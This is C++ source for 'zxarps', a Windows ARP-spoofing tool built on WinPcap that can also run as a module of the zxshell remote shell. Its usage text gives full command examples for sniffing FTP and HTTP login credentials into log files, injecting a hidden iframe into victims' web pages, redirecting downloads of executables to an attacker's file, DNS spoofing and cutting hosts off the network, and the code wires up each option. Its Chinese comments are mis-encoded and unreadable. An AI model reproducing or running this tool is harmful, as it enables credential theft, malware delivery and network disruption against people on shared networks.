// Author: LZX
// E-mail: LZX@qq.com
// QQ: 5088090
// Test PlatForm: WinXP SP2
// Compiled On: VC++ 6.0
// Platform SDK Version: Windows Server 2003 SP1 + WpdPack 3.1

// year-month-day
// Version: 2007.06.28
// Last Modified: 2007.06.28

// ��л cooldiyer �Ŀ�Դ(pZXARPS->3.1)

//2007-06-09 ���ɵ�zxshell
//2007.06.28 ��ʱ����ɨ��ָ���������еĴ������

#include "ARPSpoof.h"
//#include "..\GetOpt.h"

/*

wpcap.dll
	pcap_perror			
	pcap_sendpacket		
	pcap_next_ex		
	pcap_freealldevs	
	pcap_close			
	pcap_breakloop		
	pcap_open_live		
	pcap_findalldevs	
	
*/



CARPSpoof *pZXARPS;


char *ZXARPS_USAGE = 		
		"options:\r\n"
		"    -idx [index]       ����������\r\n"
		"    -ip [ip]           ��ƭ��IP,��'-'ָ����Χ,','����\r\n"
		"    -sethost [ip]      Ĭ��������,����ָ�����IP\r\n"
		"    -port [port]       ��ע�Ķ˿�,��'-'ָ����Χ,','����,ûָ��Ĭ�Ϲ�ע���ж˿�\r\n"
		"    -rescanInterval [val] ����ɨ��������ʱ��������λ���룬Ĭ��30000\r\n"
		"    -online            ����ɨ���ָ����IP�еĻ����\r\n"
		"----\r\n"
		"    -reset             �ָ�Ŀ�����ARP��\r\n"
		"    -rsinterval [val]  �ָ�ARP���ʱ������Ĭ��ֻ�ָ�һ��,��λ����\r\n"
		"----\r\n"
		"    -netcut            �ж�Ŀ����������\r\n"
		"    -cutmac [string]   ָ����IP����(����ָ����������)�����Ҫ�жϵ�mac,�����','����\r\n"
		"    -cutinterval [val] ��ƭ��ʱ������Ĭ��ֻ��ƭһ��,��λ����\r\n"
		"    -cutmode [val]     0|1, 0��ʾԴMAC�����1��ʾMACΪ����MAC\r\n"
		"----\r\n"
		"    -hostname [ip]     ̽������ʱ��ȡ��������Ϣ\r\n"
		"    -logfilter [string]���ñ������ݵ�����������+-_��ǰ׺,����ؼ���,\r\n"
		"                       ','�����ؼ���,�������'|'����\r\n"
		"                       ���д�+ǰ׺�Ĺؼ��ֶ����ֵİ���д���ļ�\r\n"
		"                       ��-ǰ׺�Ĺؼ��ֳ��ֵİ���д���ļ�\r\n"
		"                       ��_ǰ׺�Ĺؼ���һ��������д���ļ�(����+-����ҲҪ����)\r\n"
		"    -save_a [filename] ����׽��������д���ļ� ACSIIģʽ\r\n"
		"    -save_h [filename] HEXģʽ\r\n"
		"\r\n"
		"    -hacksite [ip]     ָ��Ҫ��������վ��������IP,\r\n"
		"                       �������','����,ûָ����Ӱ������վ��\r\n"
		"    -insert [html code]ָ��Ҫ����html����\r\n"
		"\r\n"
		"    -postfix [string]  ��ע�ĺ�׺����ֻ��עHTTP/1.1 302\r\n"
		"    -hackURL [url]     ���ֹ�ע�ĺ�׺�����޸�URL���µ�URL\r\n"
		"    -filename [name]   ��URL����Ч����Դ�ļ���\r\n"
		"\r\n"
		"    -hackdns [string]  DNS��ƭ��ֻ�޸�UDP�ı���,�������','����\r\n"
		"                       ��ʽ: ����|IP��www.aa.com|222.22.2.2,www.bb.com|1.1.1.1\r\n"
		"\r\n"
		"    -spoofip [string]  IP��ƭ�������¼����ƭ������ʱ�����ᵱ�����Ǹ���IP\r\n"
		"                       ��ʽ: ���IP|��IP\r\n"
		"\r\n"
		"    -Interval [val]    ��ʱ��ƭ��ʱ��������λ:����:Ĭ����30000 ms\r\n"
		"    -spoofmode [1|2|3] ��ƭ����:1Ϊ����,2ΪĿ���,3Ϊ����(Ĭ��)\r\n"
		"    -speed [kb]        ����ָ����IP��IP�ε������ܴ���,��λ:KB\r\n"
		"\r\n"
		"example:\r\n"
		"    ��ָ̽����IP���ж˿�80�����ݣ�����HEXģʽд���ļ�\r\n"
		"    zxarps -idx 0 -ip 192.168.0.2-192.168.0.50 -port 80 -save_h sniff.log\r\n\r\n"
		"    FTP��̽,��21��2121�˿��г���USER��PASS�����ݰ���¼���ļ�\r\n"
		"    zxarps -idx 0 -ip 192.168.0.2 -port 21,2121 -spoofmode 2 -logfilter \"_USER ,_PASS\" -save_a sniff.log\r\n\r\n"
		"    HTTP web�����½��һЩ��̳��½����̽,����������иĹؼ���\r\n"
		"    zxarps -idx 0 -ip 192.168.0.2-192.168.0.50 -port 80 -logfilter \"+POST ,+user,+pass\" -save_a sniff.log\r\n\r\n"
		"    ��|�����̽����,����FTP��HTTP��һЩ���йؼ��ֿ���һ����̽\r\n"
		"    zxarps -idx 0 -ip 192.168.0.2 -port 80,21 -logfilter \"+POST ,+user,+pass|_USER ,_PASS\" -save_a sniff.log\r\n\r\n"
		"    �����̽��Ŀ�������ļ���׺��exe�������Location:Ϊhttp://xx.net/test.exe\r\n"
		"    zxarps -idx 0 -ip 192.168.0.2-192.168.0.12,192.168.0.20-192.168.0.30 -spoofmode 3 -postfix \".exe,.rar,.zip\" -hackurl http://xx.net/ -filename test.exe\r\n\r\n"
		"    ָ����IP���е��û����ʵ�-hacksite�е���ַ��ֻ��ʾjust for fun\r\n"
		"    zxarps -idx 0 -ip 192.168.0.2-192.168.0.99 -port 80 -hacksite 222.2.2.2,www.a.com,www.b.com -insert \"just for fun<noframes>\"\r\n\r\n"
		"    ָ����IP���е��û����ʵ�������վ������һ����ܴ���, ��ÿ��������ɨ��IP���еĴ������\r\n"
		"    zxarps -idx 0 -ip 192.168.0.2-192.168.0.99 -port 80 -rescanInterval 60000 -insert \"<iframe src='xx' width=0 height=0>\"\r\n\r\n"
		"    ָ��������IP���ܴ������Ƶ�20KB\r\n"
		"    zxarps -idx 0 -ip 192.168.0.55,192.168.0.66 -speed 20\r\n\r\n"
		"    DNS��ƭ\r\n"
		"    zxarps -idx 0 -ip 192.168.0.55,192.168.0.66 -hackdns \"www.aa.com|222.22.2.2,www.bb.com|1.1.1.1\"\r\n\r\n"
		"    ��ƭԴIP, a(����IP)���ӵ�c(һ��������ƭ�Ĺ���IP)��c��¼����IP��b\r\n"
		"    zxarps -idx 0 -ip c.c.c.c -spoofip \"a.a.a.a|b.b.b.b\"\r\n\r\n"
		"    ������ѯ��������\r\n"
		"    zxarps -idx 0 -ip 192.168.0.1-192.168.0.254 -online\r\n\r\n"
		"    �жϱ��˵�����, �ɸ���spoofmode���������ػ�˫��ͬʱ�ж�\r\n"
		"    zxarps -idx 0 -ip 192.168.0.9 -netcut -cutinterval 10000\r\n\r\n"

		"\r\n"
		//"zxarps Build 06/22/2007\r\n"
		;

#if defined _ZXSHELL


int ZXARPS(MainPara *args)
{

	SOCKET Socket = args->Socket;

	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();


	if(PCAPAPI::Inited == false)
	{
		if(!PCAPAPI::Init_pcapAPI())
		{
			SendMessage(Socket, "zxarps cann't setup. please install winpcap.\r\n");
			return 0;
		}

		pZXARPS = new CARPSpoof;

	}
	if(!pZXARPS)
	{
		SendMessage(Socket, "zxarps setup failed.\r\n");
		return 0;
	}

	pZXARPS->Socket = Socket;

	char *Usage = 
		"ZXARPS.\r\n"
		"Usage:\r\n"
		"    ZXARPS [-view] [-stop] [-help]\r\n"
		;

	int ret;
	int index = ~0;
	bool x=false, reset = false, cutter = false;
	char *strIP = NULL, *strPort = NULL, *szHostIP = NULL;
	int nAdapter = pZXARPS->GetAdapterList();

	if(nAdapter == 0)
	{
		SendMessage(Socket, "Not Found Any Adapters\r\n");
		return 0;
	}

	if(!pZXARPS->GetStatus())
		pZXARPS->init();
/*
	for(int i=1; i<argc; i++)
	{
		if(argv[i][0] == '-' || argv[i][0] == '/')
		{
			if(!stricmp(&argv[i][1], "help"))
			{
				SendMessage(Socket, ZXARPS_USAGE);
				return 0;
			}
			if(!stricmp(&argv[i][1], "reset"))
			{
				reset = true;
			}
			if(!stricmp(&argv[i][1], "hostname"))
			{
				pZXARPS->EnableGetNetbiosName();
			}
			if(!stricmp(&argv[i][1], "stop"))
			{
				if(!pZXARPS->GetStatus())
				{
					return SendMessage(Socket, "ZXARPS Are Not Running.\r\n");
				}
				SendMessage(Socket, "\r\nKilling the SpoofThread......\r\n");
				pZXARPS->KillSpoofThread();
				SendMessage(Socket, "\r\nRestoring the ARPTable......\r\n");
				pZXARPS->RestoreARPTable();
				pZXARPS->StopCapture();
				pZXARPS->destroy();
				return SendMessage(Socket, "Quit.\r\n");
			}
			if(!stricmp(&argv[i][1], "view"))
			{
				if(!pZXARPS->GetStatus())
				{
					return SendMessage(Socket, "ZXARPS Is Not Running.\r\n");
				}

				SendMessage(Socket, "Setup Cmdline:\r\n%s\r\n",
					pZXARPS->cmdline);

				pZXARPS->GetAliveHostList();

				if(pZXARPS->packetcount > 0)
				{
				SendMessage(Socket, "%d packets captured writed to %s.\r\n",
					pZXARPS->packetcount,
					pZXARPS->m_SaveToFile);
				}
				return 0;
			}		
		}else
		{
			if(!stricmp(&argv[i-1][1], "idx"))
			{
				index = atoi(argv[i]);
			}else
			if(!stricmp(&argv[i-1][1], "ip"))
			{
				strIP = argv[i];
			}else
			if(!stricmp(&argv[i-1][1], "sethost"))
			{
				szHostIP = argv[i];
			}else
			if(!stricmp(&argv[i-1][1], "port"))
			{
				strPort = argv[i];
			}else
			if(!stricmp(&argv[i-1][1], "hacksite"))
			{
				if(pZXARPS->SetHackSite(argv[i]) == 0)
				{
					SendMessage(Socket, "Not found any available site to hack\r\n");
					return 0;
				}
			}else
			if(!stricmp(&argv[i-1][1], "insert"))
			{
				pZXARPS->EnableHackHtml(true);
				pZXARPS->InsertHtmlCode(argv[i]);
			}else
			if(!stricmp(&argv[i-1][1], "hackURL"))
			{
				pZXARPS->EnableHackURL(true);
				pZXARPS->SetSpoolURL(argv[i]);
			}else
			if(!stricmp(&argv[i-1][1], "filename"))
			{
				pZXARPS->SetPostfixURLFileName(argv[i]);
			}else
			if(!stricmp(&argv[i-1][1], "postfix"))
			{
				pZXARPS->AddRule_PostFix(argv[i]);
			}else
			if(!stricmp(&argv[i-1][1], "spoofmode"))
			{
				pZXARPS->SetSpoofMode(atoi(argv[i]));
			}else
			if(!stricmp(&argv[i-1][1], "Interval"))
			{
				pZXARPS->SetInterval(atoi(argv[i]));
			}else
			if(!stricmp(&argv[i-1][1], "save_h"))
			{
				pZXARPS->EnableSaveData(true);
				if(! pZXARPS->SetLogFileName(argv[i]))
				{
					SendMessage(Socket, "bad filename\r\n");
					return 0;
				}
			}else
			if(!stricmp(&argv[i-1][1], "save_a"))
			{
				pZXARPS->EnableSaveData(false);
				if(! pZXARPS->SetLogFileName(argv[i]))
				{
					SendMessage(Socket, "bad filename\r\n");
					return 0;
				}
			}else
			if(!stricmp(&argv[i-1][1], "logfilter"))
			{
				pZXARPS->SetFilter(argv[i]);
			}else
			if(!stricmp(&argv[i-1][1], "speed"))
			{
				pZXARPS->SetBandWidth(atoi(argv[i]));
			}else
			if(!stricmp(&argv[i-1][1], "hackdns"))
			{
				pZXARPS->EnableHackDNS(true);
				pZXARPS->SetHackDomainName(argv[i]);
			}else
			if(!stricmp(&argv[i-1][1], "spoofip"))
			{
				pZXARPS->EnableSpoofIP(true);
				pZXARPS->SetSpoofIP(argv[i]);
			}

		}
	}
*/
///////////////////////���������в���
	CGetOpt cmdopt(argc, argv, false);
	
	if(argc < 2)
	{
		SendMessage(Socket, Usage);
		return 0;
	}

	if(cmdopt.checkopt("help"))
	{
		SendMessage(Socket, ZXARPS_USAGE);
		return 0;
	}
	if(cmdopt.checkopt("reset"))
	{
		reset = true;
	}
	if(cmdopt.getstr("rsinterval"))
	{
		pZXARPS->SetRestoreInterval(atoi(cmdopt));
	}
	if(cmdopt.checkopt("netcut"))
	{
		cutter = true;
	}
	if(cmdopt.getstr("cutinterval"))
	{
		pZXARPS->SetCutInterval(atoi(cmdopt));
	}
	if(cmdopt.getstr("cutmac"))
	{
		pZXARPS->AddRuleToCut(cmdopt);
	}

	if(cmdopt.getstr("cutmode"))
	{
		pZXARPS->SetCutMode(atoi(cmdopt));
	}

	if(cmdopt.checkopt("hostname"))
	{
		pZXARPS->EnableGetNetbiosName();
	}
	if(cmdopt.checkopt("stop"))
	{
		if(!pZXARPS->GetStatus())
		{
			return SendMessage(Socket, "ZXARPS Are Not Running.\r\n");
		}
		SendMessage(Socket, "\r\nKilling the SpoofThread......\r\n");
		pZXARPS->KillSpoofThread();
		SendMessage(Socket, "\r\nRestoring the ARPTable......\r\n");
		pZXARPS->RestoreARPTable();
		pZXARPS->StopCapture();
		pZXARPS->destroy();
		return SendMessage(Socket, "Quit.\r\n");
	}
	if(cmdopt.checkopt("view"))
	{
		if(!pZXARPS->GetStatus())
		{
			return SendMessage(Socket, "ZXARPS Is Not Running.\r\n");
		}

		SendMessage(Socket, "Setup Cmdline:\r\n%s\r\n",
			pZXARPS->cmdline);

		pZXARPS->GetAliveHostList();

		if(pZXARPS->packetcount > 0)
		{
		SendMessage(Socket, "%d packets captured writed to %s.\r\n",
			pZXARPS->packetcount,
			pZXARPS->m_SaveToFile);
		}
		return 0;
	}
	////

	if(!cmdopt.getstr("idx"))
	{
		SendMessage(Socket, ZXARPS_USAGE);
		return 0;
	}
	index = cmdopt.getint("idx");

	if(!cmdopt.getstr("ip"))
	{
		SendMessage(Socket, ZXARPS_USAGE);
		return 0;
	}

	strIP = cmdopt;

	if(cmdopt.getstr("rescanInterval"))
	{
		pZXARPS->SetRescanInterval(atoi(cmdopt));
	}

	szHostIP = cmdopt.getstr("sethost");

	strPort = cmdopt.getstr("port");

	if(cmdopt.getstr("hacksite"))
	{
		if(pZXARPS->SetHackSite(cmdopt) == 0)
		{
			SendMessage(Socket, "Not found any available site to hack\r\n");
			return 0;
		}
	}
	if(cmdopt.getstr("insert"))
	{
		pZXARPS->EnableHackHtml(true);
		pZXARPS->InsertHtmlCode(cmdopt);
	}
	if(cmdopt.getstr("hackURL"))
	{
		pZXARPS->EnableHackURL(true);
		pZXARPS->SetSpoolURL(cmdopt);
	}
	if(cmdopt.getstr("filename"))
	{
		pZXARPS->SetPostfixURLFileName(cmdopt);
	}
	if(cmdopt.getstr("postfix"))
	{
		pZXARPS->AddRule_PostFix(cmdopt);
	}
	if(cmdopt.getstr("spoofmode"))
	{
		pZXARPS->SetSpoofMode(cmdopt.getint("spoofmode"));
	}
	if(cmdopt.getstr("Interval"))
	{
		pZXARPS->SetInterval(cmdopt.getint("Interval"));
	}
	if(cmdopt.getstr("save_h"))
	{
		pZXARPS->EnableSaveData(true);
		if(! pZXARPS->SetLogFileName(cmdopt))
		{
			SendMessage(Socket, "bad filename\r\n");
			return 0;
		}
	}
	if(cmdopt.getstr("save_a"))
	{
		pZXARPS->EnableSaveData(false);
		if(! pZXARPS->SetLogFileName(cmdopt))
		{
			SendMessage(Socket, "bad filename\r\n");
			return 0;
		}
	}
	if(cmdopt.getstr("logfilter"))
	{
		pZXARPS->SetFilter(cmdopt);
	}
	if(cmdopt.getstr("speed"))
	{
		pZXARPS->SetBandWidth(cmdopt.getint("speed"));
	}
	if(cmdopt.getstr("hackdns"))
	{
		pZXARPS->EnableHackDNS(true);
		pZXARPS->SetHackDomainName(cmdopt);
	}
	if(cmdopt.getstr("spoofip"))
	{
		pZXARPS->EnableSpoofIP(true);
		pZXARPS->SetSpoofIP(cmdopt);
	}


///////////////////////

	if(pZXARPS->GetStatus())
	{
		return SendMessage(Socket, "ZXARPS Is Already Running.\r\n");
	}

	ret = pZXARPS->OpenAdapterByIndex(index);
	if(ret == false)
	{
		SendMessage(Socket, "Open Adapter Failed!\r\n");
		return 0;
	}

	if(!pZXARPS->SetSpoofHost(szHostIP))
	{
		return 0;
	}

	ret = pZXARPS->MakeIPAndPortList(strIP, strPort);
	if(ret <= 0)
	{
		SendMessage(Socket, "IP List Is Empty.\r\n");
		return 0;
	}

	SendMessage(Socket, "Scanning Alive Host......\r\n");

	ret = pZXARPS->GetHostInfo();
	if(ret <= 0)
	{
		SendMessage(Socket, "Not Found Alive Host.\r\n");
		return 0;
	}
	pZXARPS->GetAliveHostList();

	if(cmdopt.checkopt("online"))
		return 0;
	
	if(cutter)
	{
		printf("cutting......\r\n");
		pZXARPS->LANCutter();
		printf("Bye!\r\n");
		return 0;

	}
	if(reset)
	{
		SendMessage(Socket, "Restoring the ARPTable......\r\n");
		pZXARPS->RestoreARPTable();
		SendMessage(Socket, "Quit!\r\n");
		return 0;
	}

	if(ret>0)
	{
		SendMessage(Socket, "Sniffing in background......\r\n");
		pZXARPS->StartCapture();
	}

	pZXARPS->SaveCmdline(args->lpCmd);

	return 0;
}

//����Ϊ���ɽ�zxshell�Ĵ���===========================
#else
//����Ϊ��������Ĵ���================================


int SendMessage(SOCKET Socket, const char *fmt, ...)
{

	va_list args;
	int n;
	char TempBuf[8192];
	va_start(args, fmt);
	n = vsprintf(TempBuf, fmt, args);
	va_end(args);


	printf("%s", TempBuf);
	return 0;
}

int ctrlc = 0;
BOOL WINAPI HandlerRoutine(DWORD fdwCtrlType)
{ 
	switch (fdwCtrlType) 
	{ 
		// Handle the CTRL-C signal. 
    case CTRL_C_EVENT: 
    case CTRL_CLOSE_EVENT: 
    case CTRL_BREAK_EVENT:  
    case CTRL_LOGOFF_EVENT: 
    case CTRL_SHUTDOWN_EVENT:

		ctrlc++;

		if(ctrlc == 2)
			return FALSE;
		if(ctrlc == 3)
			exit(88);
		printf("\r\nCtrl+C Is Pressed.\r\n");
		Sleep(200);
		printf("\r\nKilling the SpoofThread......\r\n");
		pZXARPS->KillSpoofThread();
		printf("\r\nRestoring the ARPTable......\r\n");
		pZXARPS->RestoreARPTable();
		printf("Exiting......\r\n");
		pZXARPS->StopCapture();
		printf("\r\nBye!\r\n");
		return TRUE;		
    default: 
		return FALSE; 
	}
}

void Usage()
{
	printf(ZXARPS_USAGE);
}

int main(int argc, char *argv[])
{
		if(PCAPAPI::Inited == false)
		{
			if(!PCAPAPI::Init_pcapAPI())
			{
				printf("zxarps cann't setup. please install winpcap.\r\n");
				return 0;
			}
			pZXARPS = new CARPSpoof;
	
		}
		if(!pZXARPS)
		{
			printf("zxarps setup failed.\r\n");
			return 0;
		}
	
		int ret;
		int index = ~0;
		bool x=false, reset = false, cutter = false;
		char *strIP = NULL, *strPort = NULL, *szHostIP = NULL;
		int nAdapter = pZXARPS->GetAdapterList();
	
		if(nAdapter == 0)
		{
			printf("Not Found Any Adapters\r\n");
			return 0;
		}
	
		SOCKET Socket = 0;

	for (int i = 1; i<argc; i++)
	{
		if (argv[i][0] == '-' || argv[i][0] == '/')
		{
			if (!stricmp(&argv[i][1], "help"))
			{
				SendMessage(Socket, ZXARPS_USAGE);
				return 0;
			}
			if (!stricmp(&argv[i][1], "reset"))
			{
				reset = true;
			}
			if (!stricmp(&argv[i][1], "hostname"))
			{
				pZXARPS->EnableGetNetbiosName();
			}
			if (!stricmp(&argv[i][1], "stop"))
			{
				if (!pZXARPS->GetStatus())
				{
					return SendMessage(Socket, "ZXARPS Are Not Running.\r\n");
				}
				SendMessage(Socket, "\r\nKilling the SpoofThread......\r\n");
				pZXARPS->KillSpoofThread();
				SendMessage(Socket, "\r\nRestoring the ARPTable......\r\n");
				pZXARPS->RestoreARPTable();
				pZXARPS->StopCapture();
				pZXARPS->destroy();
				return SendMessage(Socket, "Quit.\r\n");
			}
			if (!stricmp(&argv[i][1], "view"))
			{
				if (!pZXARPS->GetStatus())
				{
					return SendMessage(Socket, "ZXARPS Is Not Running.\r\n");
				}

				SendMessage(Socket, "Setup Cmdline:\r\n%s\r\n",
					pZXARPS->cmdline);

				pZXARPS->GetAliveHostList();

				if (pZXARPS->packetcount > 0)
				{
					SendMessage(Socket, "%d packets captured writed to %s.\r\n",
						pZXARPS->packetcount,
						pZXARPS->m_SaveToFile);
				}
				return 0;
			}
		}
		else
		{
			if (!stricmp(&argv[i - 1][1], "idx"))
			{
				index = atoi(argv[i]);
			}
			else
			if (!stricmp(&argv[i - 1][1], "ip"))
			{
				strIP = argv[i];
			}
			else
			if (!stricmp(&argv[i - 1][1], "sethost"))
			{
				szHostIP = argv[i];
			}
			else
			if (!stricmp(&argv[i - 1][1], "port"))
			{
				strPort = argv[i];
			}
			else
			if (!stricmp(&argv[i - 1][1], "hacksite"))
			{
				if (pZXARPS->SetHackSite(argv[i]) == 0)
				{
					SendMessage(Socket, "Not found any available site to hack\r\n");
					return 0;
				}
			}
			else
			if (!stricmp(&argv[i - 1][1], "insert"))
			{
				pZXARPS->EnableHackHtml(true);
				pZXARPS->InsertHtmlCode(argv[i]);
			}
			else
			if (!stricmp(&argv[i - 1][1], "hackURL"))
			{
				pZXARPS->EnableHackURL(true);
				pZXARPS->SetSpoolURL(argv[i]);
			}
			else
			if (!stricmp(&argv[i - 1][1], "filename"))
			{
				pZXARPS->SetPostfixURLFileName(argv[i]);
			}
			else
			if (!stricmp(&argv[i - 1][1], "postfix"))
			{
				pZXARPS->AddRule_PostFix(argv[i]);
			}
			else
			if (!stricmp(&argv[i - 1][1], "spoofmode"))
			{
				pZXARPS->SetSpoofMode(atoi(argv[i]));
			}
			else
			if (!stricmp(&argv[i - 1][1], "Interval"))
			{
				pZXARPS->SetInterval(atoi(argv[i]));
			}
			else
			if (!stricmp(&argv[i - 1][1], "save_h"))
			{
				pZXARPS->EnableSaveData(true);
				if (!pZXARPS->SetLogFileName(argv[i]))
				{
					SendMessage(Socket, "bad filename\r\n");
					return 0;
				}
			}
			else
			if (!stricmp(&argv[i - 1][1], "save_a"))
			{
				pZXARPS->EnableSaveData(false);
				if (!pZXARPS->SetLogFileName(argv[i]))
				{
					SendMessage(Socket, "bad filename\r\n");
					return 0;
				}
			}
			else
			if (!stricmp(&argv[i - 1][1], "logfilter"))
			{
				pZXARPS->SetFilter(argv[i]);
			}
			else
			if (!stricmp(&argv[i - 1][1], "speed"))
			{
				pZXARPS->SetBandWidth(atoi(argv[i]));
			}
			else
			if (!stricmp(&argv[i - 1][1], "hackdns"))
			{
				pZXARPS->EnableHackDNS(true);
				pZXARPS->SetHackDomainName(argv[i]);
			}
			else
			if (!stricmp(&argv[i - 1][1], "spoofip"))
			{
				pZXARPS->EnableSpoofIP(true);
				pZXARPS->SetSpoofIP(argv[i]);
			}

		}
	}
//#if defined _ZXS_PRIVATE
//	ZXSAPI::InitZXGetProcAddrFunc();
//	ZXSAPI::InitZXShellSubtleAPI();
//#endif
//
//	if(PCAPAPI::Inited == false)
//	{
//		if(!PCAPAPI::Init_pcapAPI())
//		{
//			printf("zxarps cann't setup. please install winpcap.\r\n");
//			return 0;
//		}
//		pZXARPS = new CARPSpoof;
//
//	}
//	if(!pZXARPS)
//	{
//		printf("zxarps setup failed.\r\n");
//		return 0;
//	}
//
//	int ret;
//	int index = ~0;
//	bool x=false, reset = false, cutter = false;
//	char *strIP = NULL, *strPort = NULL, *szHostIP = NULL;
//	int nAdapter = pZXARPS->GetAdapterList();
//
//	if(nAdapter == 0)
//	{
//		printf("Not Found Any Adapters\r\n");
//		return 0;
//	}
//
//	SOCKET Socket = 0;
//
//	CGetOpt cmdopt(argc, argv, false);
//	
//	if(cmdopt.checkopt("help"))
//	{
//		SendMessage(Socket, ZXARPS_USAGE);
//		return 0;
//	}
//	if(cmdopt.checkopt("reset"))
//	{
//		reset = true;
//	}
//	if(cmdopt.checkopt("print"))
//	{
//		pZXARPS->printfFlag = 1;
//	}
//	if(cmdopt.getstr("rsinterval"))
//	{
//		pZXARPS->SetRestoreInterval(atoi(cmdopt));
//	}
//	if(cmdopt.checkopt("netcut"))
//	{
//		cutter = true;
//	}
//	if(cmdopt.getstr("cutinterval"))
//	{
//		pZXARPS->SetCutInterval(atoi(cmdopt));
//	}
//	if(cmdopt.getstr("cutmac"))
//	{
//		pZXARPS->AddRuleToCut(cmdopt);
//	}
//	if(cmdopt.getstr("cutmode"))
//	{
//		pZXARPS->SetCutMode(atoi(cmdopt));
//	}
//
//	if(cmdopt.checkopt("hostname"))
//	{
//		pZXARPS->EnableGetNetbiosName();
//	}
//	if(cmdopt.checkopt("stop"))
//	{
//		if(!pZXARPS->GetStatus())
//		{
//			return SendMessage(Socket, "ZXARPS Are Not Running.\r\n");
//		}
//		SendMessage(Socket, "\r\nKilling the SpoofThread......\r\n");
//		pZXARPS->KillSpoofThread();
//		SendMessage(Socket, "\r\nRestoring the ARPTable......\r\n");
//		pZXARPS->RestoreARPTable();
//		pZXARPS->StopCapture();
//		pZXARPS->destroy();
//		return SendMessage(Socket, "Quit.\r\n");
//	}
//	if(cmdopt.checkopt("view"))
//	{
//		if(!pZXARPS->GetStatus())
//		{
//			return SendMessage(Socket, "ZXARPS Is Not Running.\r\n");
//		}
//
//		SendMessage(Socket, "Setup Cmdline:\r\n%s\r\n",
//			pZXARPS->cmdline);
//
//		pZXARPS->GetAliveHostList();
//
//		if(pZXARPS->packetcount > 0)
//		{
//		SendMessage(Socket, "%d packets captured writed to %s.\r\n",
//			pZXARPS->packetcount,
//			pZXARPS->m_SaveToFile);
//		}
//		return 0;
//	}
//	////
//
//	if(!cmdopt.getstr("idx"))
//	{
//		SendMessage(Socket, ZXARPS_USAGE);
//		return 0;
//	}
//	index = cmdopt.getint("idx");
//
//	if(!cmdopt.getstr("ip"))
//	{
//		SendMessage(Socket, ZXARPS_USAGE);
//		return 0;
//	}
//	strIP = cmdopt;
//
//	if(cmdopt.getstr("rescanInterval"))
//	{
//		pZXARPS->SetRescanInterval(atoi(cmdopt));
//	}
//
//	szHostIP = cmdopt.getstr("sethost");
//
//	strPort = cmdopt.getstr("port");
//
//	if(cmdopt.getstr("hacksite"))
//	{
//		if(pZXARPS->SetHackSite(cmdopt) == 0)
//		{
//			SendMessage(Socket, "Not found any available site to hack\r\n");
//			return 0;
//		}
//	}
//	if(cmdopt.getstr("insert"))
//	{
//		pZXARPS->EnableHackHtml(true);
//		pZXARPS->InsertHtmlCode(cmdopt);
//	}
//	if(cmdopt.getstr("hackURL"))
//	{
//		pZXARPS->EnableHackURL(true);
//		pZXARPS->SetSpoolURL(cmdopt);
//	}
//	if(cmdopt.getstr("filename"))
//	{
//		pZXARPS->SetPostfixURLFileName(cmdopt);
//	}
//	if(cmdopt.getstr("postfix"))
//	{
//		pZXARPS->AddRule_PostFix(cmdopt);
//	}
//	if(cmdopt.getstr("spoofmode"))
//	{
//		pZXARPS->SetSpoofMode(cmdopt.getint("spoofmode"));
//	}
//	if(cmdopt.getstr("Interval"))
//	{
//		pZXARPS->SetInterval(cmdopt.getint("Interval"));
//	}
//	if(cmdopt.getstr("save_h"))
//	{
//		pZXARPS->EnableSaveData(true);
//		if(! pZXARPS->SetLogFileName(cmdopt))
//		{
//			SendMessage(Socket, "bad filename\r\n");
//			return 0;
//		}
//	}
//	if(cmdopt.getstr("save_a"))
//	{
//		pZXARPS->EnableSaveData(false);
//		if(! pZXARPS->SetLogFileName(cmdopt))
//		{
//			SendMessage(Socket, "bad filename\r\n");
//			return 0;
//		}
//	}
//	if(cmdopt.getstr("logfilter"))
//	{
//		pZXARPS->SetFilter(cmdopt);
//	}
//	if(cmdopt.getstr("speed"))
//	{
//		pZXARPS->SetBandWidth(cmdopt.getint("speed"));
//	}
//	if(cmdopt.getstr("hackdns"))
//	{
//		pZXARPS->EnableHackDNS(true);
//		pZXARPS->SetHackDomainName(cmdopt);
//	}
//	if(cmdopt.getstr("spoofip"))
//	{
//		pZXARPS->EnableSpoofIP(true);
//		pZXARPS->SetSpoofIP(cmdopt);
//	}
//
//
/////////////////////////
//
	if(pZXARPS->GetStatus())
	{
		return SendMessage(Socket, "ZXARPS Is Already Running.\r\n");
	}

	ret = pZXARPS->OpenAdapterByIndex(index);
	if(ret == false)
	{
		SendMessage(Socket, "Open Adapter Failed!\r\n");
		return 0;
	}

	if(!pZXARPS->SetSpoofHost(szHostIP))
	{
		return 0;
	}

	ret = pZXARPS->MakeIPAndPortList(strIP, strPort);
	if(ret <= 0)
	{
		SendMessage(Socket, "IP List Is Empty.\r\n");
		return 0;
	}

	SendMessage(Socket, "Scanning Current Alive Hosts......\r\n");

	ret = pZXARPS->GetHostInfo();
	if(ret <= 0)
	{
		SendMessage(Socket, "Not Found Any Alive Hosts.\r\n");
		return 0;
	}
	pZXARPS->GetAliveHostList();

	//if(cmdopt.checkopt("online"))
	//	return 0;

	pZXARPS->StartupRescanThread();

	if(cutter)
	{
		printf("cutting......\r\n");
		pZXARPS->LANCutter();
		printf("Bye!\r\n");
		return 0;

	}

	if(reset)
	{
		printf("Restoring the ARPTable......\r\n");
		pZXARPS->RestoreARPTable();
		printf("Bye!\r\n");
		return 0;
	}

	SetConsoleCtrlHandler(HandlerRoutine, TRUE);

	if(ret>0)
	{
		printf("Sniffing......\r\n");
		pZXARPS->StartCapture();
		pZXARPS->wait();
	}
	return 0;
}

#endif